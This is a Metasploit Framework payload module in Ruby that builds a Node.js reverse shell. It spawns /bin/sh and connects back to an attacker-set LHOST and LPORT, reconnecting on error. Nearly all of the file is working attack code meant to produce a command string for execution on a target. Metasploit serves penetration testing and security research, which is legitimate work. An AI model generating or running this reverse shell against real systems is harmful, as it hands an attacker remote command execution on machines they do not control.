
##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'
require 'msf/core/handler/reverse_tcp'
require 'msf/base/sessions/command_shell'
require 'msf/base/sessions/command_shell_options'

module Metasploit3

	include Msf::Payload::Single
	include Msf::Sessions::CommandShellOptions

	def initialize(info = {})
		super(merge_info(info,
			'Name'          => 'Unix Command Shell, Reverse TCP (via JS)',
			'Description'   => 'Creates an interactive shell via JS',
			'Author'        => [
        'RageLtMan', # Port to MSF
        'evilpacket' # Original shell at https://github.com/evilpacket/node-shells/blob/master/node_revshell.js
        ],
			'License'       => BSD_LICENSE,
			'Platform'      => 'unix',
			'Arch'          => ARCH_CMD,
			'Handler'       => Msf::Handler::ReverseTcp,
			'Session'       => Msf::Sessions::CommandShell,
			'PayloadType'   => 'cmd',
			'RequiredCmd'   => 'js',
			'Payload'       =>
				{
					'Offsets' => { },
					'Payload' => ''
				}
			))
	end

	#
	# Constructs the payload
	#
	def generate
		vprint_good(command_string)
		return super + command_string
	end

	#
	# Returns the command string to use for execution
	#
	def command_string

 		lhost = Rex::Socket.is_ipv6?(lhost) ? "[#{datastore['LHOST']}]" : datastore['LHOST']
		cmd   = <<EOS
var net = require("net");
util = require("util");
spawn = require("child_process").spawn;
sh = spawn("/bin/sh",[]);
HOST="#{lhost}";
PORT="#{datastore["LPORT"]}";
function c(HOST,PORT) {
    var client = new net.Socket();
    client.connect(PORT, HOST, function() {
        client.pipe(sh.stdin);
        util.pump(sh.stdout,client);
    });
    client.on("error", function(e) {
        setTimeout(c(HOST,PORT), 5000);
    });
}
c(HOST,PORT);
EOS
    return "js -e '#{cmd.gsub("\n",'').gsub(/\s+/,' ').gsub(/[']/, '\\\\\'')}' >/dev/null 2>&1 & "
  end
end
